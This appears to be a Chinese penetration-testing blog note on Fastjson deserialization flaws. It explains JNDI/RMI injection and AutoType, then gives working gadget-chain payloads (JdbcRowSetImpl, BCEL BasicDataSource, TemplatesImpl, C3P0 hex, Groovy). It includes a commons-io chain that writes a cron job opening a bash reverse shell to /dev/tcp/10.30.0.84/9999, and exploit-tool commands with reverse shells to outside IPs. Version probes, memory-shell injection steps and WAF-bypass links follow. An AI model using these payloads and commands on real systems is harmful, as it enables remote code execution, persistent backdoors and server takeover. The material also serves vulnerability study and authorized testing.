+++
ShowToc = true
TocOpen = true
title = 'Fastjson'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'Java安全'
+++


# 一、FastJson介绍

Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object 之间互相转换，不需要添加额外的依赖，能够直接跑在JDK上，FastJson采用独创的算法，将序列化的速度提升到极致，深受用户喜爱。产品主要提供两个接口 JSON.toJSONString 和 JSON.parseObject/JSON.parse 来分别实现序列化和反序列化操作。 

# 二、漏洞原理

fastjson的漏洞涉及几个重要概念，深入理解一些概念后才能理解为什么会出现这种情况，以及一些面试官为什么会问一些奇怪的问题，比如fastjson不出网利用、如何判断版本等；

## 2.1 JNDI注入的前置知识

### 2.1.1 Java Bean

一类满足标准写法的类，满足以下条件的Java类可以称之为Java Bean。





1、成员变量均使用private关键字进行修饰





2、提供构造方法(有参/无参)





3、为每个成员变量提供set/get方法

### 2.1.2 反射

一种可以调用任意类任意方法的类；

### 2.1.3 序列化和反序列化

远程数据传输，不安全的反序列化可以造成RCE；

### 2.1.4 JNDI

Java名称与目录服务接口，可以理解为一个强大的通讯录，可以定位用户、网络、对象、机器等等资源

![](/zj_img/WEBRESOURCE0cc7bd9389f51609d1ea7294c65b0e20image.png)

在实战利用中，常见的服务为LDAP、DNS、RMI，具体的代码实现效果为，如果lookup可控就可以导致JNDI注入

```
InitialContext context = new InitialContext();
context.lookup("rmi://localhost:1099/HelloService");
```

具体流程如下：

1、目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控； 

2、攻击者控制URI参数为恶意的RMI服务地址，如：rmi://hacker_rmi_server//name； 

3、攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类； 

4、目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例； 

5、攻击者可以在Factory类文件的

另外一种解释：

JNDI支持将一个名称映射到一个Java对象,可以通过JNDI中的lookup函数向特定的提供命名服务的服务器发起查询请求获取具体对象。lookup函数可以向远程的提供目录服务的服务器发起请求查询指定对象，如果返回的是Reference类型的对象，JNDI会解析该对象的classFactory、classFactoryLocation属性。

**一些版本注入的问题：**




```
RMI攻击主要分3种目标：RMI Client、RMI Server、RMI Registry。
使用远程Reference字节码进行攻击。（最初始的方式，没有任何拦截）
从jdk8u121开始，RMI加入了反序列化白名单机制，JRMP的payload登上舞台，这里的
payload指的是ysoserial修改后的JRMPClient。（黑名单拦截一些类的截断）
从jdk8u121开始，RMI远程Reference代码默认不信任，RMI远程Reference代码攻击
方式开始失效。（直接不信任rmi）
从jdk8u191开始，LDAP远程Reference代码默认不信任，LDAP远程Reference代码攻
击方式开始失效，需要通过javaSerializedData返回序列化gadget方式实现攻击。
（直接不信任ldap，这以后基本都是基于本地的gadget去做复现了））
RMI服务端执行bind，我们就可以攻击RMI Registry注册中心，导致其反序列化RCE。
RMI客户端使用lookup方法理论上可以主动攻击RMI Registry
RMI Registry在RMI客户端使用lookup方法的时候，可以实现被动攻击RMI客户端
来看一下这个路程
（1）先开始什么都没有处理，rmi开启的端口可以直接发送数据过去被反序列化
（2）发现不对劲，所以java增加了黑名单机制（细节这里没讲），所以开始利用
jrmp的payload（其实就是绕过了黑名单能发送数据的类）
（3）后续rmi被不信任以后，研究人员发现了ldap也可以远程加载目录，ldap登上了
舞台
（4）ldap也被不信任，相当于无法远程加载，目前给的方法就是直接打过去让本
地存在的链子命令执行，不需要像外部做加载。
```

**高版本注入的解决办法：**

高版本JDK在RMI和LDAP的trustURLCodebase都做了限制，从默认允许远程加载ObjectFactory变成了不允许，绕过思路为：

1、找到一个受害者本地CLASSPATH中的类作为恶意的Reference Factory工厂类，并利用这个本地的Factory类执行命令。


2、利用LDAP直接返回一个恶意的序列化对象，JNDI注入依然会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。

```
https://github.com/qi4L/JYso/
```

**老版本JRE下载：**

```
http://www.oracle.com/technetwork/java/archive-139210.html
```

### 2.1.5 RMI

远程方法调用

任何可以被远程调用方法的对象必须实现序列化和远程接口，或者手工初始化远程对象，客户端本地必须有远程对象的接口，不然无法指定要调用的方法，而且其全限定名必须与服务器上的对象完全相同，从逻辑上可以简单的理解为调用远程对象，或者方法。

客户端通过调用stub来远程访问服务端的对象，其中的端口和地址等由Stub负责。

![](/zj_img/WEBRESOURCEa46f9794d7ff8517d038f46640fdc90eimage.png)

注册表机制，为了获取Stub用以正确调用远程对象而存在：

 RMIRegistry也是一个远程对象，默认监听在1099端口上

![](/zj_img/WEBRESOURCE756e47cd296588faf3b4f532a515600eimage.png)

#### 动态加载类

RMI核心特点之一就是动态类加载，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，动态加载的对象class文件可以使用Web服务的方式进行托管。这可以动态的扩展远程应用的功能，RMI注册表上可以动态的加载绑定多个RMI应用。对于客户端而言，服务端返回值也可能是一些子类的对象实例，而客户端并没有这些子类的class文件，如果需要客户端正确调用这些子类中被重写的方法，则同样需要有运行时动态加载额外类的能力。客户端使用了与RMI注册表相同的机制。RMI服务端将URL传递给客户端，客户端通过HTTP请求下载这些类。 

## 2.2 Fastjosn的原理

有了前置知识后，我们大概可以明白jndi注入的原理，从实战的角度出发，那么需要几个条件：

1、lookup函数内容可控制；

2、目标主机可访问rmi或者ldap服务器；

### 2.2.1 Fastjson中setter方法的作用

在反序列化的过程中需要为创建的对象中的成员变量进行赋值,在赋值的过程中如果成员变量是私有的,就需要调用对应成员的setter方法为其进行赋值，并且这个过程是自动调用的.

举个例子，假如有个类叫做student:

```
public class Student {
    private String name;
    private int age;

    public void setName(String name){
        this.name = name;
    }
    public void void setAge(int age){
        this.age = age;
    }
    public String getName(){
        return name;
    }
    public int getAge(){
        return age;
    }
}
```

在fastjosn中，正常设置该属性




```
import com.alibaba.fastjson.JSON;

public class Main {

    public static void main(String[] args) {
        String json = "{\"age\":20,\"name\":\"Liming\"}";
        Student xiaoming = JSON.parseObject(json,Student.class);
    }
}
```

在这个例子中，设置对象的属性就是默认调用了对象的set方法，如果set方法中还有恶意命令，则可以造成命令执行。

### 2.2.2 AutoType机制

在上一步的反序列化中，我们需要指定传入的Student.class，也就是

 FastJson的AutoType机制支持在反序列化的过程中

FastJson自动获取对应的Class字节码对象，从而进行反射创建实例,为对象属性赋值等操作(和正常情况一样)，唯一的区别是不用直接传递class对象了，在JSON字符串中使用@type健即可自动获取类对应的Class对象。

所以有了这个序列化的对象：

```
{"@type":"Student","age":20,"name":"xiaoming"}
```

大概意思就是，会自动生成一个Student对象，并调用set方法去设置age和name。

至此其实已经完成了fastjson的漏洞解析，接下来，无非就是利用哪条链的问题了，可以利用的链需要满足以下要求：

1、存在set、get方法；

2、set、get方法传参可控；

3、传参后相关链子可用达到RCE的作用；

4、最后是相关依赖最好比较普遍，以便于利用；

## 2.3 Fastjson的利用链

### 3.1 com.sun.rowset.JdbcRowSetImpl利用链

这条链子其实就是上面JNDI注入的讲解，大致情况如下：

![](/zj_img/WEBRESOURCEa5d018b0d290385f5855eaf558449178e23a8130bdd952623bb2e4a004e4f14c.jpg)

该链的POC大概这样：

```
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap/rmi Server", "autoCommit":true}
```

代码分析：

JdbcRowSetImpl的dataSourceName方法，该方法其实就是一个简单的赋值，核心其实就一句super.setDataSourceName(dsName): 调用父类的方法来设置数据源。

![](/zj_img/WEBRESOURCEf269c4dcf0a0b7f4880d6043e110ef93image.png)

然后是autoCommit方法，这里其实是设置是否自动提交的方法，调用conn方法去连接：

![](/zj_img/WEBRESOURCEa3c4743c9517e0a4acd7a7db02e3d443image.png)

conn方法，大概内容是判断连接是否存在，如果DataSourceName不为空，就通过jndi去查找数据源，这里有lookuo函数，就走到了jndi注入的地方：

![](/zj_img/WEBRESOURCEe7d732cb3e0c109be344e5653a23e9f9image.png)

### 3.2 org.apache.tomcat.dbcp.dbcp2.BasicDataSource链

此利用链只能应用于

#### 3.2.1 BCEL

BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，BCEL库提供了一系列用于分析、创建、修改Java Class文件的API。就这个库的功能来看，其使用面远不及同胞兄弟们，但是他比Commons Collections特殊的一点是，它被包含在了原生的JDK中，位于com.sun.org.apache.bcel，但是注意的是在JDK- 8u251之后的BCEL中没有类加载器。

BCEL这个包中有个类com.sun.org.apache.bcel.internal.util.ClassLoader，他是一个ClassLoader，但是他重写了Java内置的ClassLoader#loadClass()方法。 在ClassLoader#loadClass()中，其会判断类名是否是$$BCEL$$开头，如果是的话，将会对这个字符串进行decode。可以理解为是传统字节码的HEX编码，再将反斜线替换成$。默认情况下外层还会加一层GZip压缩。

#### 3.2.2 org.apache.tomcat.dbcp.dbcp2.BasicDataSource

这条链子不在jdk中，使用tomcat的时候可以尝试，值得注意的是不同版本的tomcat-dbcp最后对应的payload有所不同：





Tomcat7 org.apache.tomcat.dbcp.dbcp.BasicDataSource


Tomcat8及以后 org.apache.tomcat.dbcp.dbcp2.BasicDataSource

payload：




```
{
    {
        "x":{
                "@type": "org.apache.tomcat.dbcp.dbcp2.BasicDataSource",
                "driverClassLoader": {
                    "@type": "com.sun.org.apache.bcel.internal.util.ClassLoader"
                },
                "driverClassName": "$$BCEL$$$l$8b$I$A$..."
        }
    }: "x"
}
```

链子解析，在BasicDataSource中存在这方法，

简单来说，这串代码可以让我们指定加载的对象和加载器，而driverClassName和driverClassLoader都是有set方法可以指定的。

其实到这里，payload已经比较好认识了，首先是指定，

![](/zj_img/WEBRESOURCEb0a96f2d106731235f825f4c80e37ec0image.png)

当然在到达createConnectionFactory方法之前，他是被其他方法调用的，链子为getConnection()->createDataSource()->createConnectionFactory()，当调用toString的时候，会依次调用该类的getter方法获取值。然后会以字符串的形式输出出来。所以会调用到getConnection方法.

但是要触发getter方法，需要让JSONObject位于JSON的key上，所以会出现两个X包裹的情况，当使用JSON.parseObject(poc);等方法反序列化中会出现。

### 3.2.3 com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl 链

大致方法大差不差，也可以作为不出网的方法，但是条件非常苛刻，jdk版本、反序列化的格式等，都会导致漏洞无法利用；

```
{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["base64"],"_name":"a.b","_tfactory":{ },"_outputProperties":{ },"_version":"1.0","allowedProtocols":"all"}
```

### 3.2.4 Inet4Address dns链

```
{"b":{"@type":"java.net.Inet4Address","val":"ailx10.iye2ck.dnslog.cn"}}
```

### 3.2.5 C3P0 hexbase的链

poc代码如下，使用IDEA加载class文件即可，可用于不出网的情况，该链子还有JNDI和远程类加载

```
import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.HashMap;

public class Test {
    public static void main(String[] args) throws Exception {
        String hex2 = bytesToHex(tobyteArray(gen()));
        String FJ1247 = "{\n" +
                "    \"a\":{\n" +
                "        \"@type\":\"java.lang.Class\",\n" +
                "        \"val\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\"\n" +
                "    },\n" +
                "    \"b\":{\n" +
                "        \"@type\":\"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\",\n" +
                "        \"userOverridesAsString\":\"HexAsciiSerializedMap:" + hex2 + ";\",\n" +
                "    }\n" +
                "}\n";
        System.out.println(FJ1247);
    }
    //FastJson原生反序列化加载恶意类字节码
    public static Object gen() throws Exception {
        TemplatesImpl templates = TemplatesImpl.class.newInstance();
        byte[] bytes = Files.readAllBytes(Paths.get("e:\\FRain.class")); //刚才做好的内存马我是放在e盘下，读取其中字节即可
        setValue(templates, "_bytecodes", new byte[][]{bytes});
        setValue(templates, "_name", "1");
        setValue(templates, "_tfactory", null);

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);

        BadAttributeValueExpException bd = new BadAttributeValueExpException(null);
        setValue(bd,"val",jsonArray);

        HashMap hashMap = new HashMap();
        hashMap.put(templates,bd);
        return hashMap;
    }
    public static void setValue(Object obj, String name, Object value) throws Exception{
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    //将类序列化为字节数组
    public static byte[] tobyteArray(Object o) throws IOException {
        ByteArrayOutputStream bao = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bao);
        oos.writeObject(o);   //
        return bao.toByteArray();
    }

    //字节数组转十六进制
    public static String bytesToHex(byte[] bytes) {
        StringBuffer stringBuffer = new StringBuffer();
        for (int i = 0; i < bytes.length; i++) {
            String hex = Integer.toHexString(bytes[i] & 0xff);      //bytes[]中为带符号字节-255~+255，&0xff: 保证得到的数据在0~255之间
            if (hex.length()<2){
                stringBuffer.append("0" + hex);   //0-9 则在前面加‘0’,保证2位避免后面读取错误
            }else {
                stringBuffer.append(hex);
            }
        }
        return stringBuffer.toString();
    }
}
```

### 3.2.6 commons-io写文件链

写文件利用链，常用于1.2.68及以上

计划任务的POC：

```
public static void main(String[] args) throws Exception {
    	String code = gzcompress("* * * * *  bash -i >& /dev/tcp/10.30.0.84/9999 0>&1 \n");
    	//<=1.2.68 and JDK11
        String payload = "{\r\n"
        		+ "    \"@type\":\"java.lang.AutoCloseable\",\r\n"
        		+ "    \"@type\":\"sun.rmi.server.MarshalOutputStream\",\r\n"
        		+ "    \"out\":\r\n"
        		+ "    {\r\n"
        		+ "        \"@type\":\"java.util.zip.InflaterOutputStream\",\r\n"
        		+ "        \"out\":\r\n"
        		+ "        {\r\n"
        		+ "           \"@type\":\"java.io.FileOutputStream\",\r\n"
        		+ "           \"file\":\"/var/spool/cron/root\",\r\n"
        		+ "           \"append\":false\r\n"
        		+ "        },\r\n"
        		+ "        \"infl\":\r\n"
        		+ "        {\r\n"
        		+ "            \"input\":\r\n"
        		+ "            {\r\n"
        		+ "                \"array\":\""+code+"\",\r\n"
        		+ "                \"limit\":1999\r\n"
        		+ "            }\r\n"
        		+ "        },\r\n"
        		+ "        \"bufLen\":1048576\r\n"
        		+ "    },\r\n"
        		+ "    \"protocolVersion\":1\r\n"
        		+ "}\r\n"
        		+ "";
        
        System.out.println(payload);
        JSON.parseObject(payload);
    }
    public static String gzcompress(String code) {
    	byte[] data = code.getBytes();
        byte[] output = new byte[0];
        Deflater compresser = new Deflater();
        compresser.reset();
        compresser.setInput(data);
        compresser.finish();
        ByteArrayOutputStream bos = new ByteArrayOutputStream(data.length);
        try {
            byte[] buf = new byte[1024];
            while (!compresser.finished()) {
                int i = compresser.deflate(buf);
                bos.write(buf, 0, i);
            }
            output = bos.toByteArray();
        } catch (Exception e) {
            output = data;
            e.printStackTrace();
        } finally {
            try {
                bos.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        compresser.end();
        System.out.println(Arrays.toString(output));
        return Base64.getEncoder().encodeToString(output);
    }
```

payload:

```

{
    "\u0040\u0074\u0079\u0070\u0065":"java.lang.AutoCloseable",
    "\u0040\u0074\u0079\u0070\u0065":"sun.rmi.server.MarshalOutputStream",
    "out":
    {
        "\u0040\u0074\u0079\u0070\u0065":"java.util.zip.InflaterOutputStream",
        "out":
        {
           "\u0040\u0074\u0079\u0070\u0065":"java.io.FileOutputStream",
           "file":"/var/spool/cron/root",
           "append":false
        },
        "infl":
        {
            "input":
            {
                "array":"eJzTUtCCQoWkxOIMBd1MBTs1Bf2U1DL9kuQCfUMDPWMDPQM9CxN9SyBQMLBTM1TgAgBAXQuq",
                "limit":1999
            }
        },
        "bufLen":1048576
    },
    "protocolVersion":1
}
```

最后还要修改

### 3.2.7 Groovy 链

该链普遍认为是fastjson1.2.76-1.2.80较为可能达成的链子。

poc:

1、




```
{
    "@type":"java.lang.Exception",
    "@type":"org.codehaus.groovy.control.CompilationFailedException",
    "unit":{}
}
```

2、




```
{
    "@type":"org.codehaus.groovy.control.ProcessingUnit",
    "@type":"org.codehaus.groovy.tools.javac.JavaStubCompilationUnit",
    "config":{
        "@type":"org.codehaus.groovy.control.CompilerConfiguration",
        "classpathList":"http://127.0.0.1:81/attack-1.jar"
    }
}
```

还有其他链可以参考下文

# **三、漏洞利用**

[https://github.com/safe6Sec/Fastjson](https://github.com/safe6Sec/Fastjson)

[https://github.com/lemono0/FastJsonParty/blob/main/Fastjson%E5%85%A8%E7%89%88%E6%9C%AC%E6%A3%80%E6%B5%8B%E5%8F%8A%E5%88%A9%E7%94%A8-Poc.md](https://github.com/lemono0/FastJsonParty/blob/main/Fastjson%E5%85%A8%E7%89%88%E6%9C%AC%E6%A3%80%E6%B5%8B%E5%8F%8A%E5%88%A9%E7%94%A8-Poc.md)


FastJson漏洞，从2017年爆出以来，从最初的1.2.24版本到比较新的1.2.83 2022年，已经经历了较多版本，1.2.24之前版本可以做到通杀，且没黑白名单机制，而后在1.2.25中设置了默认不开启
autotype，1.2.47出现了不开启autotype的利用方式，且通杀。 基于漫长的历史时间，不同的版本存在不同的黑白名单机制，利用链也天差地别，所以黑盒测试中确定FastJson版本可能是能决定是否能成功利用的关键动作之一。


除开报错直接返回准确版本之外，探测方式主要为两种：一种为延迟探测，一种为DNSlog探测，这里只记录几个关键RCE版本

# 四、DNS探测

可用于探测是否访问DNS，但无法确定是否存在反序列化

```
{"@type":"java.net.URL","val":"http://dnslog"}
{{"@type":"java.net.URL","val":"http://dnslog"}:"x"}
{"@type":"java.net.InetAddress","val":"dnslog"}
{"@type":"java.net.Inet4Address","val":"dnslog"}
{"@type":"java.net.Inet6Address","val":"dnslog"}
{{"@type":"java.net.URL","val":"dnslog"}:"aaa"}
{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://dnslog"}}""}
Set[{"@type":"java.net.URL","val":"http://dnslog"}]
Set[{"@type":"java.net.URL","val":"http://dnslog"}
{"@type":"java.net.InetSocketAddress"{"address":,"val":"dnslog"}}
{{"@type":"java.net.URL","val":"http://dnslog"}:0
```

# 五、不出网利用

前言：不出网利用，通常是

1、写静态文件

2、写webshell，前提知道路径

3、内存马

4、dns外带

5、利用tomcat\Spring等中间件进行回显

常见的可用链：

```
1、BasicDataSource链
2、C3P0 hexbase的链
3、TemplatesImpl链
4、commons-io写webshell 或者读一些敏感文件
```

# 六、自动化工具复现

java -cp jndi_tool.jar jndi.EvilRMIServer 1099 8888 "bash -i >&/dev/tcp/192.168.2.40/9999 0>&1"

java -cp jndi_tool.jar jndi.EvilRMIServer 1099 8888 "bash -i >&/dev/tcp/1.14.74.119/8888 0>&1"

恶意类启动建议使用：

```
https://toolaffix.oss-cn-beijing.aliyuncs.com/wyzxxz/jndi_tool.jar
```

POC建议使用：

```
https://github.com/zhzyker/exphub/tree/946405b3447dbaf2a5eb49e2f56ec33fe1165e49/fastjson
```

值得注意的几个大版本，1.2.24 通杀、1.2.47 ，这两个可以进行JNDI注入反弹shell，1.2.68版本很难使用JNDI注入了，所以常用写文件的方式进行RCE，1.2.80版本同理，受益于浅蓝大佬的公开，得以使用，但实战利用条件同样苛刻。

# 七、内存马注入

## 1、JNDI注入内存马：

生成哥斯拉内存马：

![](/zj_img/WEBRESOURCE2252676750d37c1b9814059859c54283image.png)

开启http服务：

![](/zj_img/WEBRESOURCE952f2dc8aa7ade6cd6478f775b671407image.png)

开启rmi服务，注意最好使用jdk 8

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.5.106:8888/#a" 9999
```

![](/zj_img/WEBRESOURCEe255eed7da6b57489997a9b1199f33b2image.png)

添加密码和密钥,Referer:连接即可：

![](/zj_img/WEBRESOURCE30348d3b989d57b7e692fc6e9039b536image.png)

## 2、C3P0 内存马注入

参见3.2.5

## 3、BCEL注入

## 4、写文件charsets.jar注入

这种方法属于是对计划任务不出网的一种补充，但是实操难度较高。

[https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks](https://github.com/LandGrey/spring-boot-upload-file-lead-to-rce-tricks)

# 八、FastJsonParty

[https://github.com/lemono0/FastJsonParty](https://github.com/lemono0/FastJsonParty)

该靶场是目前fastjson的集大成内容，主要涉及各大利用链、版本识别、版本绕过等。

# 九、fastjson的识别，这里只探讨识别，不涉及版本判断

1、当返回的内容中带有fastjson字样时判断为使用了fastjson，这种应该是框架抛出的；

2、当报错格式大概为以下格式的时候，很大程度可能使用了fastjson；

![](/zj_img/WEBRESOURCEdec9d15b82f605a95d9d1ea941be1d44image.png)

3、type=Internal Server Error, status=500，这种也是框架抛出的

4、一些特殊的payload

该payload可能导致抛出fastjson版本：

```
{"@type": "java.lang.AutoCloseable"
["test":1] 
```

解码hex和unicode编码

```
{"\u0040\u0074\u0079\u0070\u0065": "\u006A\u0061\u0076\u0061\u002E\u006C\u0061\u006E\u0067\u002E\u0041\u0075\u0074\u006F\u0043\u006C\u006F\u0073\u0065\u0061\u0062\u006C\u0065"
```

5、这个payload 可能出现 autoType is not support. whatever

```
{"@type":"whatever"}
```

# 十、其他

依赖链判断方法：

```
{
  "x": {
    "@type": "java.lang.Character"{
  "@type": "java.lang.Class",
  "val": "org.springframework.web.bind.annotation.RequestMapping"
		}
	}
```

![](/zj_img/WEBRESOURCE4b6ec0d9edb65a056bd95c0d8c1e5abfimage.png)

绕过：

```
https://y4tacker.github.io/2022/03/30/year/2022/3/%E6%B5%85%E8%B0%88Fastjson%E7%BB%95waf/
```